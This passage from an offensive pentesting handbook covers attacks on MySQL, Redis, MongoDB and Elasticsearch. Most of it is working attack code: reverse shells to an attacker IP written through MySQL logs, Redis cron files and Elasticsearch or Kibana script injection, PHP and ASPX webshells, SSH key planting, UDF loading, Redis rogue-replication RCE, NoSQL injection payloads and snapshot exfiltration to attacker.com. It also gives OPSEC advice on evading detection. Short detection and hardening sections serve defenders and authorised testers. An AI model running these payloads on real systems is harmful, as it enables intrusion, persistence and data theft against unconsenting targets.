SELECT '<?php system($_GET["cmd"]); ?>' OR SLEEP(11);  -- Triggers slow query log
SET GLOBAL slow_query_log = 'OFF';

-- SSH key write via log
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/root/.ssh/authorized_keys';
SELECT 'ssh-rsa AAAAB3NzaC1yc2EAAAA... attacker@host';
SET GLOBAL general_log = 'OFF';

-- Crontab write via log (Linux)
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/spool/cron/crontabs/root';
SELECT '* * * * * bash -i >& /dev/tcp/10.10.14.5/4444 0>&1';
SET GLOBAL general_log = 'OFF';
```

### 4.4 UDF (User Defined Functions) for Command Execution

```bash
# UDF loading requires FILE privilege and access to plugin directory
# Check plugin directory:
# SELECT @@plugin_dir;  -- Usually /usr/lib/mysql/plugin/ or similar

# lib_mysqludf_sys provides sys_exec() and sys_eval()
# Pre-compiled libraries: https://github.com/mysqludf/lib_mysqludf_sys

# On attacker machine, compile UDF:
# gcc -g -c raptor_udf2.c -o raptor_udf2.o -fPIC
# gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

```sql
-- Upload UDF binary via SQL (hex encoding)
-- Method 1: Write to plugin directory
SELECT UNHEX('7f454c46...') INTO DUMPFILE '/usr/lib/mysql/plugin/udf_sys.so';

-- Method 2: Via table and DUMPFILE
CREATE TABLE temp_udf(line BLOB);
INSERT INTO temp_udf VALUES (LOAD_FILE('/tmp/udf_sys.so'));
SELECT * FROM temp_udf INTO DUMPFILE '/usr/lib/mysql/plugin/udf_sys.so';
DROP TABLE temp_udf;

-- Create function from loaded library
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf_sys.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf_sys.so';

-- Execute commands
SELECT sys_eval('id');
SELECT sys_eval('whoami');
SELECT sys_exec('bash -i >& /dev/tcp/10.10.14.5/4444 0>&1');

-- Cleanup
DROP FUNCTION sys_exec;
DROP FUNCTION sys_eval;
-- Note: Cannot easily delete the .so file via SQL
```

### 4.5 LOAD DATA LOCAL INFILE (Client File Read)

This attack reads files from the MySQL client's filesystem, not the server. The server sends a fake "LOCAL INFILE" request to trick the client into sending a file.

```sql
-- On attacker-controlled rogue MySQL server:
-- When a client connects and issues any query,
-- respond with a LOCAL INFILE request for a target file

-- Tools:
-- Rogue MySQL Server: https://github.com/allyshka/Rogue-MySql-Server
-- mysql_file_reader from Innotec

-- Usage scenario:
-- 1. Attacker sets up rogue MySQL server on port 3306
-- 2. Victim connects (e.g., via SSRF, application misconfiguration)
-- 3. Rogue server requests LOCAL INFILE for /etc/passwd
-- 4. Client sends the file contents to the attacker

-- Legitimate client-side file read (if LOCAL INFILE is enabled):
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE test FIELDS TERMINATED BY '\n';
SELECT * FROM test;
```

### 4.6 MySQL Credential Extraction

```sql
-- MySQL 5.7+
SELECT user, authentication_string FROM mysql.user;
-- Hash format: *HASH (SHA1(SHA1(password)))
-- Hashcat: -m 300

-- MySQL 4.x and earlier
SELECT user, password FROM mysql.user;
-- Old hash format: hashcat -m 200

-- Check for credential reuse in application config files
SELECT LOAD_FILE('/var/www/html/wp-config.php');  -- WordPress
SELECT LOAD_FILE('/var/www/html/config.php');
SELECT LOAD_FILE('/var/www/html/.env');
```

### 4.7 ProxySQL Abuse

```sql
-- ProxySQL is a high-performance MySQL proxy commonly used for load balancing
-- Default admin interface: port 6032 (admin/admin)

-- Connect to ProxySQL admin
mysql -h 10.10.10.100 -P 6032 -u admin -padmin

-- Extract backend MySQL credentials
SELECT * FROM mysql_servers;
SELECT * FROM mysql_users;  -- Backend credentials in plaintext or hashed

-- Modify query rules for interception
INSERT INTO mysql_query_rules (rule_id, active, match_pattern, replace_pattern)
VALUES (100, 1, '^SELECT', 'SELECT *, password FROM');

-- Redirect traffic through attacker proxy
UPDATE mysql_servers SET hostname='10.10.14.5' WHERE hostgroup_id=1;
LOAD MYSQL SERVERS TO RUNTIME;
```

---

## 5. Redis

Redis runs on TCP/6379 by default and is commonly deployed as a caching layer, message broker, or session store. It frequently runs without authentication and provides several paths to RCE.

### 5.1 Enumeration and Unauthenticated Access

```bash
# Discover Redis instances
nmap -p 6379 --script redis-info 10.10.10.100

# Connect without authentication
redis-cli -h 10.10.10.100

# Basic enumeration
INFO
INFO server
INFO keyspace
CONFIG GET *
CONFIG GET dir
CONFIG GET dbfilename
CLIENT LIST
DBSIZE
KEYS *
```

### 5.2 SSH Key Writing

```bash
# Generate SSH key pair
ssh-keygen -t rsa -f redis_key -N ""

# Prepare payload (pad with newlines to avoid corruption)
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > payload.txt

# Write SSH key via Redis
redis-cli -h 10.10.10.100 flushall
cat payload.txt | redis-cli -h 10.10.10.100 -x set ssh_key
redis-cli -h 10.10.10.100 config set dir /root/.ssh/
redis-cli -h 10.10.10.100 config set dbfilename "authorized_keys"
redis-cli -h 10.10.10.100 save

# Connect via SSH
ssh -i redis_key root@10.10.10.100

# Alternative directories:
# /home/redis/.ssh/
# /home/ubuntu/.ssh/
# /var/lib/redis/.ssh/
```

### 5.3 Crontab Writing

```bash
# Write a cron job for reverse shell
redis-cli -h 10.10.10.100 flushall
redis-cli -h 10.10.10.100 set cron_payload "\n\n* * * * * bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\n\n"
redis-cli -h 10.10.10.100 config set dir /var/spool/cron/
redis-cli -h 10.10.10.100 config set dbfilename root
redis-cli -h 10.10.10.100 save

# For Debian/Ubuntu (different cron directory):
redis-cli -h 10.10.10.100 config set dir /var/spool/cron/crontabs/
redis-cli -h 10.10.10.100 config set dbfilename root
redis-cli -h 10.10.10.100 save

# Alternative: /etc/cron.d/ (requires proper formatting)
redis-cli -h 10.10.10.100 config set dir /etc/cron.d/
redis-cli -h 10.10.10.100 config set dbfilename revshell
redis-cli -h 10.10.10.100 set payload "\n\n* * * * * root bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\n\n"
redis-cli -h 10.10.10.100 save
```

### 5.4 Webshell Writing

```bash
# Write PHP webshell (if web root is accessible)
redis-cli -h 10.10.10.100 config set dir /var/www/html/
redis-cli -h 10.10.10.100 config set dbfilename shell.php
redis-cli -h 10.10.10.100 set webshell "\n\n<?php system($_GET['cmd']); ?>\n\n"
redis-cli -h 10.10.10.100 save

# Access webshell
curl "http://10.10.10.100/shell.php?cmd=id"

# For ASP.NET (if IIS web root)
redis-cli -h 10.10.10.100 config set dir C:\inetpub\wwwroot\
redis-cli -h 10.10.10.100 config set dbfilename shell.aspx
redis-cli -h 10.10.10.100 set webshell "\n\n<%@ Page Language=\"C#\" %><% System.Diagnostics.Process.Start(\"cmd.exe\", \"/c \" + Request[\"cmd\"]); %>\n\n"
redis-cli -h 10.10.10.100 save
```

### 5.5 SLAVEOF / REPLICAOF Replication RCE

This technique exploits Redis's master-slave replication to load a malicious shared library module onto the target.

```bash
# redis-rogue-server technique
# 1. Attacker runs a rogue Redis server with a malicious .so module
# 2. Target Redis is instructed to replicate from attacker's server
# 3. Malicious module is transferred via replication (fullresync)
# 4. Module is loaded, providing command execution

# Using redis-rogue-server tool
python3 redis-rogue-server.py --rhost 10.10.10.100 --rport 6379 --lhost 10.10.14.5 --lport 15000

# Manual steps:
# On target Redis:
SLAVEOF 10.10.14.5 15000
# Wait for replication sync (module .so transferred as RDB)
MODULE LOAD /tmp/exp.so
# Or: MODULE LOAD ./exp.so

# Execute commands via loaded module
system.exec "id"
system.rev 10.10.14.5 4444  # Reverse shell

# Stop replication
SLAVEOF NO ONE

# Redis 5.0+ uses REPLICAOF instead:
REPLICAOF 10.10.14.5 15000
# ... module load and exec ...
REPLICAOF NO ONE

# Tools:
# redis-rogue-server: https://github.com/n0b0dyCN/redis-rogue-server
# redis-rce: https://github.com/Ridter/redis-rce
# RedisModules-ExecuteCommand: https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
```

### 5.6 Lua Scripting RCE

```bash
# Redis supports Lua scripting via EVAL command
# Lua sandbox limits OS access, but some bypasses exist

# Information gathering via Lua
redis-cli -h 10.10.10.100 EVAL "return redis.call('INFO')" 0

# File operations (if loadlib available - older versions)
redis-cli -h 10.10.10.100 EVAL "local io_l = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io'); local io = io_l(); local f = io.popen('id', 'r'); local res = f:read('*a'); f:close(); return res" 0

# EVAL with key enumeration
redis-cli -h 10.10.10.100 EVAL "local keys = redis.call('KEYS', '*'); local result = ''; for i,v in ipairs(keys) do result = result .. v .. ': ' .. redis.call('GET', v) .. '\n' end; return result" 0

# Note: Modern Redis (6.0+) has more restricted Lua sandbox
# Module loading is more reliable for RCE
```

### 5.7 Redis ACL and Authentication Bypass

```bash
# Redis 6.0+ introduced ACLs (Access Control Lists)
# Check ACL configuration
AUTH password_here
ACL LIST
ACL GETUSER default

# Common weak configurations:
# requirepass with weak password
# Default user with full permissions
# ACL rules allowing CONFIG/MODULE commands

# Redis AUTH brute force
hydra -P passwords.txt 10.10.10.100 redis

# Nmap brute force
nmap -p 6379 --script redis-brute 10.10.10.100
```

---

## 6. MongoDB

MongoDB runs on TCP/27017 by default and is the most popular NoSQL database. Historically, many installations ran without authentication, and NoSQL injection remains a significant attack vector.

### 6.1 Enumeration and Unauthenticated Access

```bash
# Discover MongoDB instances
nmap -p 27017 --script mongodb-info,mongodb-databases 10.10.10.100

# Connect without authentication
mongosh --host 10.10.10.100
# or older client:
mongo --host 10.10.10.100

# Basic enumeration
show dbs
use admin
show collections
db.getUsers()
db.adminCommand({listDatabases: 1})
db.currentOp()
db.serverStatus()

# Check authentication requirement
db.adminCommand({getCmdLineOpts: 1})
# If --auth or security.authorization is not set, no auth required
```

### 6.2 NoSQL Injection

```bash
# Operator injection (bypassing authentication)
# Original login query: db.users.find({username: INPUT, password: INPUT})

# JSON injection via HTTP parameters:
POST /login
{"username": {"$ne": ""}, "password": {"$ne": ""}}
# Returns first user (usually admin) where username and password are not empty

# URL-encoded form parameters:
username[$ne]=&password[$ne]=
username[$gt]=&password[$gt]=

# Regex-based extraction
{"username": "admin", "password": {"$regex": "^a.*"}}
{"username": "admin", "password": {"$regex": "^ab.*"}}
# Iterate character by character to extract password

# $where injection (JavaScript execution)
{"$where": "this.username == 'admin' && this.password.match(/^a/)"}
# If $where is allowed, can execute arbitrary JavaScript

# Boolean-based blind NoSQL injection
{"username": "admin", "password": {"$gt": "a"}}  # True if password > "a"
{"username": "admin", "password": {"$gt": "m"}}  # Binary search

# Always-true conditions
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$ne": "nonexistent"}, "password": {"$ne": "nonexistent"}}

# Array injection
{"username": "admin", "password": {"$in": ["password1", "password2", "password3"]}}

# Type confusion
{"username": "admin", "password": {"$type": 2}}  # Match any string type
```

### 6.3 Server-Side JavaScript Execution

```javascript
// $where operator for arbitrary JavaScript
db.users.find({$where: function() {
  return (this.username == 'admin');
}});

// OS command execution via $where (if server-side JS is enabled)
// Note: MongoDB 4.4+ deprecated mapReduce JS; 5.0 removed server-side JS execution in mapReduce
db.users.find({$where: "sleep(5000)"})  // Time-based detection

// mapReduce for code execution (MongoDB < 5.0)
db.users.mapReduce(
  function() { emit(1, this.username); },
  function(key, values) { return values.join(','); },
  { out: "map_output" }
);

// Aggregation pipeline injection
db.users.aggregate([
  {$match: {username: "admin"}},
  {$addFields: {leaked: "$password"}}
]);

// CVE-2025-23061 - Mongoose $where Bypass
// Nesting $where under $or bypassed the top-level filter in Mongoose 8.8.3
// Fixed in 8.9.5 with sanitizeFilter: true
{"$or": [{"$where": "sleep(5000)"}]}
```

### 6.4 MongoDB Credential Extraction

```javascript
// List all users (requires userAdminAnyDatabase or root role)
use admin
db.system.users.find().pretty()

// MongoDB stores passwords as SCRAM-SHA-1 or SCRAM-SHA-256 hashes
// Extract for offline cracking:
db.system.users.find({}, {user: 1, credentials: 1}).pretty()

// Connection string extraction
// Check for stored connection strings in application databases
use app_db
db.config.find({key: /connection|database|mongo/i})

// Environment variables (if accessible)
// Check /proc/PID/environ for MONGODB_URI, MONGO_URL, etc.
```

### 6.5 NoSQLMap Tool

```bash
# Automated NoSQL injection testing
# https://github.com/codingo/NoSQLMap

python nosqlmap.py
# Options:
# 1. Set target URL
# 2. Set MongoDB host
# 3. Set parameters to test
# 4. Run injection tests
# 5. Dump database contents

# Direct MongoDB access exploitation
python nosqlmap.py --attack 2 --victim 10.10.10.100 --port 27017
```

---

## 7. Elasticsearch

Elasticsearch runs on TCP/9200 (HTTP) and TCP/9300 (transport) by default. It is often deployed without authentication in internal networks and provides scripting capabilities that can lead to RCE.

### 7.1 Enumeration and Unauthenticated Access

```bash
# Discover Elasticsearch
nmap -p 9200,9300 --script elasticsearch-info 10.10.10.100

# Basic enumeration via HTTP
curl http://10.10.10.100:9200/
curl http://10.10.10.100:9200/_cluster/health
curl http://10.10.10.100:9200/_cluster/stats
curl http://10.10.10.100:9200/_nodes
curl http://10.10.10.100:9200/_cat/indices?v
curl http://10.10.10.100:9200/_cat/nodes?v

# List all indices
curl http://10.10.10.100:9200/_cat/indices?v

# Dump index contents
curl http://10.10.10.100:9200/INDEX_NAME/_search?size=1000&pretty
curl http://10.10.10.100:9200/INDEX_NAME/_search?q=*&pretty

# Search for sensitive data
curl http://10.10.10.100:9200/_all/_search?q=password&pretty
curl http://10.10.10.100:9200/_all/_search?q=secret&pretty
curl http://10.10.10.100:9200/_all/_search?q=key&pretty
curl http://10.10.10.100:9200/_all/_search?q=credential&pretty

# Cluster settings (check for security configuration)
curl http://10.10.10.100:9200/_cluster/settings?pretty
```

### 7.2 Groovy Scripting RCE (Elasticsearch < 1.4.3)

```bash
# CVE-2015-1427 - Groovy sandbox bypass
# Elasticsearch versions < 1.4.3 allowed arbitrary Groovy code execution

curl -X POST "http://10.10.10.100:9200/_search?pretty" -H 'Content-Type: application/json' -d'
{
  "size": 1,
  "script_fields": {
    "exec": {
      "script": "java.lang.Runtime.getRuntime().exec(\"id\")"
    }
  }
}'

# With output capture
curl -X POST "http://10.10.10.100:9200/_search?pretty" -H 'Content-Type: application/json' -d'
{
  "size": 1,
  "script_fields": {
    "exec": {
      "script": "import java.util.*;import java.io.*;new Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next()"
    }
  }
}'

# Reverse shell
curl -X POST "http://10.10.10.100:9200/_search?pretty" -H 'Content-Type: application/json' -d'
{
  "size": 1,
  "script_fields": {
    "exec": {
      "script": "java.lang.Runtime.getRuntime().exec([\"bash\",\"-c\",\"bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\"] as String[])"
    }
  }
}'
```

### 7.3 Painless Scripting RCE (Elasticsearch 5.x)

```bash
# CVE-2017-11479, CVE-2017-11480 - Painless script sandbox escape
# Elasticsearch 5.x with Painless scripting

# Create an index with a document
curl -X PUT "http://10.10.10.100:9200/test/doc/1" -H 'Content-Type: application/json' -d'
{"name": "test"}'

# Execute OS commands via Painless
curl -X POST "http://10.10.10.100:9200/test/_search?pretty" -H 'Content-Type: application/json' -d'
{
  "size": 1,
  "script_fields": {
    "exec": {
      "script": {
        "lang": "painless",
        "inline": "def x = Runtime.getRuntime().exec(\"id\"); def reader = new BufferedReader(new InputStreamReader(x.getInputStream())); def output = \"\"; def line = \"\"; while ((line = reader.readLine()) != null) { output = output + line; } return output;"
      }
    }
  }
}'

# Using _update_by_query for script execution
curl -X POST "http://10.10.10.100:9200/test/_update_by_query?pretty" -H 'Content-Type: application/json' -d'
{
  "script": {
    "lang": "painless",
    "inline": "ctx._source.field = Runtime.getRuntime().exec(\"touch /tmp/pwned\")"
  }
}'
```

### 7.4 Snapshot Repository for Data Extraction

```bash
# If Elasticsearch has snapshot repositories configured,
# extract full index snapshots for offline analysis

# List repositories
curl http://10.10.10.100:9200/_snapshot?pretty

# List snapshots in a repository
curl http://10.10.10.100:9200/_snapshot/REPO_NAME/_all?pretty

# Create a new repository pointing to attacker-controlled location
# (requires cluster admin)
curl -X PUT "http://10.10.10.100:9200/_snapshot/exfil" -H 'Content-Type: application/json' -d'
{
  "type": "fs",
  "settings": {
    "location": "/tmp/es_exfil"
  }
}'

# Create snapshot
curl -X PUT "http://10.10.10.100:9200/_snapshot/exfil/snapshot_1?wait_for_completion=true"

# URL repository (if allowed) - exfil to remote
curl -X PUT "http://10.10.10.100:9200/_snapshot/remote_exfil" -H 'Content-Type: application/json' -d'
{
  "type": "url",
  "settings": {
    "url": "http://attacker.com/es_data/"
  }
}'
```

### 7.5 Kibana Exploitation

```bash
# Kibana typically runs on port 5601
# Default: no authentication in older versions

# Kibana Server-Side Request Forgery
# Timelion and Canvas may allow SSRF to internal services

# Kibana Console (Dev Tools) - direct Elasticsearch API access
# If Kibana is accessible, use the Console to run all Elasticsearch attacks

# Kibana Prototype Pollution (CVE-2019-7609)
# Kibana < 6.6.1: RCE via Timelion prototype pollution
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/10.10.14.5/4444 0>&1");process.exit()//')
.es(*).props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')

# Access Kibana dashboards for sensitive data
# Default dashboards may contain internal metrics, user data, logs
```

---

## 8. Cross-Database Attack Patterns

### 8.1 Database-to-OS Pivoting Summary

```
+----------------+-------------------------------------------+------------------+
| Database       | Command Execution Method                  | Required Priv    |
+----------------+-------------------------------------------+------------------+
| MSSQL          | xp_cmdshell                               | sysadmin         |
| MSSQL          | OLE Automation (sp_OACreate)              | sysadmin         |
| MSSQL          | CLR Assembly                              | sysadmin         |
| MSSQL          | SQL Agent Job                             | SQLAgentUser+    |
| Oracle         | DBMS_SCHEDULER                            | CREATE JOB       |
| Oracle         | Java Stored Procedure                     | CREATE JAVA      |
| Oracle         | External Table + preprocessor             | CREATE TABLE     |
| PostgreSQL     | COPY PROGRAM                              | superuser        |
| PostgreSQL     | PL/Python (plpythonu)                     | superuser        |
| PostgreSQL     | Custom Extension (.so)                    | superuser        |
| MySQL          | UDF (sys_exec/sys_eval)                   | FILE + INSERT    |
| MySQL          | General log + webshell                    | SUPER            |
| Redis          | Module loading                            | admin/no auth    |
| Redis          | Cron/SSH key writing                      | CONFIG access    |
| Redis          | SLAVEOF replication                       | admin/no auth    |
| MongoDB        | $where JavaScript                         | varies           |
| Elasticsearch  | Groovy/Painless scripting                 | no auth (old)    |
+----------------+-------------------------------------------+------------------+
```

### 8.2 Database Credential Harvesting Across Platforms

```bash
# Extract credentials from one database to pivot to another

# Application config file locations:
# /var/www/html/wp-config.php          (WordPress - MySQL creds)
# /var/www/html/.env                    (Laravel/Node - various DB creds)
# /var/www/html/config/database.yml     (Rails - various DB creds)
# /var/www/html/web.config              (ASP.NET - MSSQL connection strings)
# /opt/app/application.properties       (Spring Boot - various DB creds)
# /opt/app/appsettings.json             (ASP.NET Core - connection strings)

# Kubernetes secrets (if pod access):
# /var/run/secrets/kubernetes.io/serviceaccount/
# Environment variables: env | grep -i database
# ConfigMaps: kubectl get configmap -o yaml

# Cloud metadata for database credentials:
# AWS Secrets Manager via SSRF -> metadata -> IAM -> secrets
# Azure Key Vault via managed identity
# GCP Secret Manager via service account
```

### 8.3 Database Trust Exploitation

```
# MSSQL Linked Server chains:
# ServerA -> ServerB -> ServerC (each may have different privileges)
# A compromised low-privilege user on ServerA may be sysadmin on ServerC

# PostgreSQL dblink chains:
# Connect from one PostgreSQL to another, chaining access

# Oracle Database Links:
# Similar to MSSQL linked servers, traverse trust relationships

# MongoDB Replica Set exploitation:
# Compromise one member, access all data in the replica set
# Write to primary propagates to all secondaries

# Redis Sentinel / Cluster:
# Compromise Sentinel to redirect clients to rogue master
# Cluster mode: access any node to read/write all slots
```

---

## 9. 2025-2026 Techniques and Research

### 9.1 Recent CVEs

```
# CVE-2025-1094 - PostgreSQL psql SQL Injection
# Invalid UTF-8 handling enables SQL injection -> RCE chain
# Affects: All PostgreSQL versions before 17.3, 16.7, 15.11, 14.16, 13.19
# Impact: Critical - SQL injection leading to arbitrary code execution

# CVE-2025-2945 - pgAdmin 4 Authenticated RCE
# Authenticated remote code execution in pgAdmin web management interface
# Affects: pgAdmin versions before fix

# CVE-2025-23061 - Mongoose $where Bypass
# Nested $where operator under $or bypassed sanitization
# First patch (8.8.3) was incomplete; fixed properly in 8.9.5
# New option: sanitizeFilter: true to prevent operator injection

# Varonis "Rusty Pearl" - PostgreSQL Extension RCE
# Multiple vulnerabilities in PostgreSQL extensions enabling RCE
# PL/Perl trusted language extension exploited for code execution
# Discovered by Varonis Threat Labs in 2025

# SQLRecon v3.x (2025) - Enhanced MSSQL Red Team Toolkit
# C# SQL toolkit with updated modules for:
# - CLR assembly loading without touching disk
# - Linked server crawling
# - Impersonation chain discovery
# - Azure SQL Database support

# Redis 7.x Security Changes
# Improved ACL system, restricted CONFIG commands
# Module loading restrictions in newer versions
# But legacy deployments remain widespread and vulnerable
```

### 9.2 Cloud Database Exploitation

```bash
# AWS RDS Exploitation
# RDS instances are not directly accessible from metadata
# But stolen IAM credentials can:
aws rds describe-db-instances  # Enumerate instances
aws rds modify-db-instance --master-user-password newpass  # Reset password
aws rds-data execute-statement --sql "SELECT * FROM users"  # Aurora Data API

# Azure SQL Database
# Managed identity access via SSRF -> metadata -> token
# Token endpoint: http://169.254.169.254/metadata/identity/oauth2/token
# Use token to authenticate to Azure SQL Database
sqlcmd -S server.database.windows.net -d database -G  # AAD auth

# GCP Cloud SQL
# Service account impersonation via metadata
# Cloud SQL Auth Proxy exploitation
# Compromised service account key -> full database access

# Serverless Database Exploitation (2025)
# PlanetScale, Neon, Supabase, CockroachDB Serverless
# Connection string exposure in client-side code
# Shared infrastructure isolation bypass research ongoing
```

### 9.3 Container and Kubernetes Database Attacks

```bash
# Database pods in Kubernetes
# Default service discovery: DATABASE_SERVICE_HOST, DATABASE_SERVICE_PORT
# Internal DNS: db-service.namespace.svc.cluster.local

# Unauthenticated access to databases inside the cluster
# Many deployments skip auth for in-cluster communication

# Redis in Kubernetes (common patterns)
kubectl get pods -l app=redis
# Access via port-forward or direct pod network access
redis-cli -h redis-master.default.svc.cluster.local

# MongoDB in Kubernetes
mongosh mongodb://mongodb-0.mongodb-headless.default.svc.cluster.local:27017

# Secrets extraction for database credentials
kubectl get secrets -o yaml
# Decode: echo "BASE64_SECRET" | base64 -d

# Helm chart default values often contain weak/default credentials
# Check: values.yaml in deployed Helm releases
helm get values RELEASE_NAME
```

---

## Detection and Defense

### Database Audit Logging

```sql
-- MSSQL: Enable SQL Server Audit
CREATE SERVER AUDIT [SecurityAudit]
TO FILE (FILEPATH = 'C:\SQLAudit\')
WITH (ON_FAILURE = CONTINUE);
ALTER SERVER AUDIT [SecurityAudit] WITH (STATE = ON);

-- Monitor for: xp_cmdshell execution, CLR assembly creation,
-- linked server queries, EXECUTE AS, sp_configure changes

-- PostgreSQL: Enable logging
-- postgresql.conf:
-- log_statement = 'all'
-- log_connections = on
-- log_disconnections = on
-- pgaudit extension for detailed audit logging

-- MySQL: Enable general query log (performance impact)
-- SET GLOBAL general_log = 'ON';
-- Better: Use MySQL Enterprise Audit or percona-audit-log plugin

-- Oracle: Enable unified auditing
-- AUDIT POLICY ora_secureconfig;
-- CREATE AUDIT POLICY custom_policy ACTIONS EXECUTE;
```

### Detection Indicators

```
# High-confidence indicators of database exploitation:

# MSSQL:
- sp_configure changes (xp_cmdshell, CLR, OLE Automation)
- CREATE ASSEMBLY statements
- xp_cmdshell/xp_dirtree execution
- EXECUTE AT statements (linked server abuse)
- EXECUTE AS LOGIN/USER statements
- SQL Agent job creation by non-admin accounts

# PostgreSQL:
- COPY ... TO PROGRAM statements
- CREATE EXTENSION (plpythonu, plperlu, dblink)
- lo_import/lo_export calls
- pg_read_file on sensitive paths
- Large object creation followed by export

# MySQL:
- UDF creation (CREATE FUNCTION ... SONAME)
- INTO OUTFILE/DUMPFILE to web-accessible paths
- General log file path changes
- LOAD DATA LOCAL INFILE from unexpected clients

# Redis:
- CONFIG SET dir/dbfilename to sensitive paths
- MODULE LOAD commands
- SLAVEOF/REPLICAOF to external IPs
- KEYS * or DEBUG commands from unexpected sources

# MongoDB:
- $where operator in queries (JavaScript execution)
- mapReduce with arbitrary JavaScript
- db.system.users queries
- Queries with operator injection patterns ($ne, $gt, $regex)

# Elasticsearch:
- Script execution in search queries
- _snapshot repository creation
- Cluster settings modifications
- Access to _all endpoint
```

### Hardening Recommendations

```
# Universal Database Hardening:
1. Strong authentication (no default credentials, enforce password complexity)
2. Network segmentation (databases should not be internet-accessible)
3. Principle of least privilege (no unnecessary SUPER/DBA/sysadmin grants)
4. Enable audit logging for sensitive operations
5. Encrypt connections (TLS/SSL for all database protocols)
6. Regular patching (CVE-2025-1094, etc.)
7. Disable unnecessary features (xp_cmdshell, CLR, dangerous extensions)
8. Monitor for unusual query patterns and connection sources

# MSSQL-specific:
- Disable xp_cmdshell, OLE Automation, CLR unless required
- Remove unnecessary linked servers
- Use Windows Authentication over SQL Authentication
- Set TRUSTWORTHY OFF on all databases
- Disable sa account or rename it

# PostgreSQL-specific:
- Restrict superuser access
- Configure pg_hba.conf with minimal access rules
- Disable untrusted language extensions (plpythonu, plperlu)
- Set fsync = on, restrict COPY PROGRAM

# Redis-specific:
- Always require authentication (requirepass or ACLs)
- Bind to specific interfaces (not 0.0.0.0)
- Disable dangerous commands: rename-command CONFIG ""
- Use TLS for connections
- Restrict MODULE LOAD capability
```

---

## OPSEC Considerations

```
# Query Logging:
- Most databases log all queries by default or can be configured to
- xp_cmdshell executions are logged in SQL Server error log
- PostgreSQL COPY PROGRAM generates log entries
- Assume all SQL commands are recorded in audit trails

# Process Creation:
- OS commands via database engines create child processes
- These appear in EDR/Sysmon logs as children of sqlservr.exe, postgres, mysqld, etc.
- Parent-child process relationship is a high-fidelity detection signal
- Consider using in-memory techniques (CLR assembly) over xp_cmdshell

# Network Indicators:
- Unusual connections from database servers (reverse shells, HTTP callbacks)
- MSSQL UNC path authentication generates NTLM traffic
- Redis SLAVEOF creates replication traffic to external IPs
- Database-to-database links to unexpected destinations

# Credential Handling:
- Extracted database hashes should be cracked offline
- Avoid brute-forcing in production (lockout, logging)
- Rotate through discovered credentials systematically
- Document credential reuse patterns for the engagement report

# Cleanup:
- Remove CLR assemblies, UDFs, and loaded modules after use
- Restore CONFIG settings (Redis dir/dbfilename)
- Delete uploaded files (webshells, SSH keys, cron entries)
- Drop SQL Agent jobs created for persistence testing
- Revert sp_configure changes on MSSQL
- Uninstall unnecessary PostgreSQL extensions

# Minimizing Footprint:
- Use existing database features over uploading tools
- Prefer SELECT/read operations over WRITE operations
- Time exploitation during business hours to blend with normal queries
- Use database-native encryption for exfiltrated data
- Limit the scope of credential extraction (targeted vs. full dump)
```

---

## Cross-References

- [../02-initial-access/web-application-attacks.md](../02-initial-access/web-application-attacks.md) - SQL injection and web-to-database exploitation chains
- [../05-privilege-escalation/README.md](../05-privilege-escalation/README.md) - Database privilege escalation techniques
- [../07-credential-access/README.md](../07-credential-access/README.md) - Credential extraction and cracking
- [../04-persistence/README.md](../04-persistence/README.md) - Database-based persistence mechanisms
- [../08-discovery/README.md](../08-discovery/README.md) - Network and service discovery for databases
- [../10-collection-and-exfiltration/README.md](../10-collection-and-exfiltration/README.md) - Data exfiltration from databases
- [../12-active-directory-deep-dive/README.md](../12-active-directory-deep-dive/README.md) - MSSQL and Active Directory integration attacks
- [../13-cloud-security/README.md](../13-cloud-security/README.md) - Cloud database exploitation (RDS, Azure SQL, Cloud SQL)
- [../TOOLS_ARSENAL.md](../TOOLS_ARSENAL.md) - Complete tools reference

---

## References

- MITRE ATT&CK T1210 - Exploitation of Remote Services: https://attack.mitre.org/techniques/T1210/
- MITRE ATT&CK T1021 - Remote Services: https://attack.mitre.org/techniques/T1021/
- MITRE ATT&CK T1505.001 - SQL Stored Procedures: https://attack.mitre.org/techniques/T1505/001/
- HackTricks - Pentesting MSSQL: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
- HackTricks - Pentesting PostgreSQL: https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql
- HackTricks - Pentesting Redis: https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis
- Red Team Garage - Attacking MSSQL: https://www.redteamgarage.com/attacking-mssql
- Tarlogic - Red Team Tales MSSQL: https://www.tarlogic.com/blog/red-team-tales-0x01/
- Tarlogic - Lateral Movement via MSSQL CLR: https://www.tarlogic.com/blog/lateral-movement-mssql-clr-socket-reuse/
- IBM X-Force - SQLRecon: https://www.ibm.com/think/x-force/databases-beware-abusing-microsoft-sql-server-with-sqlrecon
- ODAT - Oracle Database Attacking Tool: https://github.com/quentinhardy/odat
- Hackviser - Oracle Database Pentesting: https://hackviser.com/tactics/pentesting/services/oracle
- Hackviser - Redis Pentesting: https://hackviser.com/tactics/pentesting/services/redis
- CVE-2025-1094 PostgreSQL SQL Injection: https://www.rapid7.com/blog/post/2025/02/13/cve-2025-1094-postgresql-psql-sql-injection-fixed/
- CVE-2025-2945 pgAdmin RCE: https://blog.certcube.com/pgadmin-4-9-1-authenticated-rce-cve-2025-2945/
- Varonis - Rusty Pearl PostgreSQL RCE: https://www.varonis.com/blog/rusty-pearl
- Redis Replication RCE: https://medium.com/@knownsec404team/rce-exploits-of-redis-based-on-master-slave-replication-ef7a664ce1d0
- Redis Rogue Server: https://github.com/n0b0dyCN/redis-rogue-server
- NoSQLMap: https://github.com/codingo/NoSQLMap
- Database Pentesting Cheatsheet 2025: https://www.0xczr.com/tools/database_pentesting_cheatsheet/
